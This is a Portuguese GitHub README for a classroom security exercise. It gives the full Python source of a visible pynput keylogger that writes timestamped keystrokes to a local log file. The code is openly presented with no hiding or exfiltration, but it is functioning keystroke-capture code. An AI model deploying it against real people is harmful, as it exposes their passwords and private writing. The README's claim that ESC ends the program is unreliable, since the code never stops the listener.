# Criptografia-keylogger
Repositório criado para realização das aulas de segurança da DIO/Santander

# Python Keylogger Demo

Este projeto demonstra como usar a biblioteca **pynput** em Python para capturar teclas pressionadas e salvar em um arquivo de log.

## 🚀 Funcionalidades
- Captura teclas normais (letras, números, símbolos).
- Identifica teclas especiais (Enter, Esc, Tab, etc).
- Ignora teclas como Shift, Ctrl, Alt.
- Registra data e hora de cada tecla pressionada.
- Encerra automaticamente ao pressionar **ESC**.

## 📂 Estrutura
- `keylogger.py`: código principal.
- `requirements.txt`: dependências do projeto.

## ▶️ Como executar
1. Clone este repositório:
   ```bash
git clone *github.com/joaoalmeidarar/Criptografia-keylogger

Código do Keyloger

from pynput import keyboard
from datetime import datetime

# Teclas que serão ignoradas no log
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

# Função para registrar a tecla pressionada
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        # Teclas normais (letras, números, símbolos)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Teclas especiais
        with open("log.txt", "a", encoding="utf-8") as f:
            if key in IGNORAR:
                return
            elif key == keyboard.Key.space:
                f.write(f"{timestamp} - [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"{timestamp} - [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(f"{timestamp} - [TAB]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"{timestamp} - [BACKSPACE]\n")
            elif key == keyboard.Key.esc:
                f.write(f"{timestamp} - [ESC]\n")
            else:
                f.write(f"{timestamp} - [{key.name.upper()}]\n")

# Inicia o listener
print("🔍 Capturando teclas... Pressione ESC para encerrar.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

    
